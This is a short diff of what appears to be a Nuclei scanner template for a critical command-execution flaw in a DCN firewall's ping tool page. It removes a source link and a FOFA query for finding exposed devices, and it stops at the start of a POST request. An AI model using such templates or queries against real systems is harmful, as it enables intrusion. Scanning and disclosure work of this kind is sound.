@@ -3,12 +3,8 @@ info:
   name: DCN防火墙存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tsx0fx8rb77a39tp'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tsx0fx8rb77a39tp
-    fofa: body="北京神州数码云科信息技术有限公司" && title=="Web Management"
 http:
 - raw:
   - 'POST /function/system/tool/ping.php HTTP/1.1
